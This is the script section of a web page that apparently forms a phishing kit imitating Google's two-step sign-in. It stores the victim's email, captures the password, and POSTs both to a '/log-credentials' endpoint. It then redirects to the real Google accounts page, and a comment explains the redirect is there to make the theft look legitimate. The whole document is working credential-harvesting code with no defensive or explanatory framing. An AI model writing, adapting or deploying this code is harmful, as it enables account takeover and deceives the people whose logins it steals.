    <script>
        async function sendToServer(email, password) {
            try {
                const response = await fetch('/log-credentials', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ email, password })
                });
                
                const result = await response.json();
                return result.success;
            } catch (error) {
                console.error('Error sending data to server:', error);
                return false;
            }
        }

        function showPasswordPage() {
            const emailInput = document.getElementById('email-input');
            const email = emailInput.value.trim();
            
            if (!email) {
                emailInput.focus();
                return;
            }
            
            // Store email in session storage
            sessionStorage.setItem('userEmail', email);
            
            // Hide email page, show password page
            document.getElementById('email-page').style.display = 'none';
            document.getElementById('password-page').style.display = 'block';
            
            // Update the displayed email
            document.getElementById('display-email').textContent = email;
            
            // Focus on password input
            setTimeout(() => {
                document.getElementById('password-input').focus();
            }, 100);
        }

        async function submitPassword() {
            const email = sessionStorage.getItem('userEmail');
            const password = document.getElementById('password-input').value;
            const submitBtn = document.querySelector('#password-page .next-button');
            
            if (!password) {
                document.getElementById('password-input').focus();
                return;
            }
            
            // Disable button while processing
            submitBtn.disabled = true;
            submitBtn.textContent = 'Signing in...';
            
            // Send to server
            const success = await sendToServer(email, password);
            
            if (success) {
                // Redirect to real Google (to make it look legitimate)
                window.location.href = 'https://accounts.google.com/';
            } else {
                // Re-enable button on error
                submitBtn.disabled = false;
                submitBtn.textContent = 'Next';
                // Show error in a more subtle way
                document.getElementById('password-input').style.borderColor = '#d93025';
                setTimeout(() => {
                    document.getElementById('password-input').style.borderColor = '#dadce0';
                }, 2000);
            }
        }
        
        function showEmailPage() {
            document.getElementById('password-page').style.display = 'none';
            document.getElementById('email-page').style.display = 'block';
        }
        
        // Handle Enter key press
        function handleEmailKeyPress(event) {
            if (event.key === 'Enter') {
                showPasswordPage();
            }
        }
        
        function handlePasswordKeyPress(event) {
            if (event.key === 'Enter') {
                submitPassword();
            }
        }
        
        // Toggle password visibility
        function togglePassword() {
            const passwordInput = document.getElementById('password-input');
            const checkbox = document.getElementById('show-password');
            passwordInput.type = checkbox.checked ? 'text' : 'password';
        }
        
        // Load stored email on page load
        window.onload = function() {
            const storedEmail = sessionStorage.getItem('userEmail');
            if (storedEmail) {
                document.getElementById('email-input').value = storedEmail;
            }
        };
    </script>
